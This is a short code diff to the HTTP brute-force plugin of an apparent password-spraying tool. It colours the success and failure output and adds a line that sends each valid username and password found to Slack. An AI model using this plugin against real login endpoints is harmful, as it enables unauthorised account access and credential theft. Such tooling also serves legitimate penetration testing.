@@ -2,9 +2,8 @@ import datetime, requests, requests_ntlm
 import utils.utils as utils
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
-
-def httpbrute_authenticate(url, username, password, useragent, pluginargs): # CHANGEME: replace template with plugin name
-
+def httpbrute_authenticate(url, username, password, useragent, pluginargs): 
+    
     ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
 
     data_response = {
@@ -61,15 +60,16 @@ def httpbrute_authenticate(url, username, password, useragent, pluginargs): # CH
 
         if resp.status_code == 200:
             data_response['success'] = True
-            data_response['output'] = 'SUCCESS: => {}:{}'.format(username, password)
+            data_response['output'] = utils.prGreen('[!] SUCCESS: => {}:{}'.format(username, password))
+            utils.slacknotify(username, password)
 
         elif resp.status_code == 401:
             data_response['success'] = False
-            data_response['output'] = 'FAILURE: => {}:{}'.format(username, password)
+            data_response['output'] = utils.prRed('FAILURE: => {}:{}'.format(username, password))
 
         else: #fail
             data_response['success'] = False
-            data_response['output'] = 'UNKNOWN_RESPONSE_CODE: {} => {}:{}'.format(resp.status_code, username, password)
+            data_response['output'] = utils.prYellow('UNKNOWN_RESPONSE_CODE: {} => {}:{}'.format(resp.status_code, username, password))
 
 
     except Exception as ex:
